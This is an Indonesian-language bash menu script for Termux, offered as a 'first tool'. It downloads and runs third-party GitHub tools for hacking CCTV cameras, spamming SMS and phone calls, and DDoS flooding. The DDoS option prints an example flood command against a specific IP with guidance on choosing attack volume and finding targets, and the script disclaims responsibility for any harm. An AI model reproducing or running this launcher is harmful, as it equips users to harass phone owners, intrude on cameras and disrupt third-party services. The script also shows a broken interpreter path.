#!/user/bin/bash

read -p "Siapa namamu?" nama
echo "Hai selamat datang di tools pertama saya!" $nama 
sleep 2
clear
sleep 1
echo "________________________________________"
echo "Author by:MR.IT4"
echo "Wa admin:+6285756706735"
echo "Supported by:MR.IN3WWW"
echo "Gihub:"
echo "________________________________________"
echo "[1].Hack cctv"
echo "[2].Spam sms"
echo "[3].spam telepon"
echo "[4].Ddos"
echo "[5].exit"
read -p "Masukkan pilhan anda :" pilhan
if [ $pilhan = "1"  ]
then
    echo "Jadinya tools atau tidak itu bukan salah saya saya hanya share saja ok?"
    sleep 4
    clear
    pkg update && pkg upgrade
    pkg install python 2
    pkg install git
    pip2 install requests
    git clone https://github.com/kancotdiq/ipcs
    cd ipcs
    python2 scan.py
elif [ $pilhan = "2" ]
then
    echo "Jadinya tools atau tidak itu bukan salah saya saya hanya share saja ok?"
    sleep 4
    clear
    pkg update && pkg upgrade
    pkg install python
    pkg install python2
    pip2 install requests
    git clone https://github.com/B4N954N2-ID/Brutal-sms
    cd Brutal-sms
    ls
    python2 brutal.py
elif [ $pilhan = "3" ]
then
    echo "Jadinya tools atau tidak itu bukan salah saya saya hanya share saja ok?"
    sleep 4
    clear
    pkg update && pkg upgrade
    pkg install python2
    pip2 install requests
    git clone https://github.com/B4N954N2-ID/SpamTelp
    cd SpamTelp
    ls
    python2 SpamTelp.py
elif [ $pilhan = "4" ]
then
    pkg update && pkg upgrade
    pkg install python2
    pkg install git
    git clone https://github.com/4L13199/LITEDDOS
    ls
    cd LITEDDOS
    clear
    echo "Gua kasih contoh yaa gimnaa cara ddos "
    echo "Sebuah web atau apalah yg kalian ingin ddos"
    echo "INI CONTOH"
    echo "python2 LITEDDOS.Py 172.217.10.46 80 1000"
    echo "Itu hanya contoh yaa"
    echo "1000 itu hnyalah jumlah penyerangan jadi itu tergantung dari kalian untuk"
    echo "Menyerang terserah kalian mau serang dengan"
    echo "Brpaa jumlah itu tergantung dari kalian"
    echo "Ok?"
    sleep 15
    echo "Jika kalian ingin cari tau ip silhkan cek di ip "
    echo "info.com"
    sleep 15
elif [ $pilhan = "5" ]
then
    echo "Byee bossqu:v"
    echo "Saya hanyalah newbie:)"
    sleep 4
    exit
else
    echo "Salah bossqu:("
fi

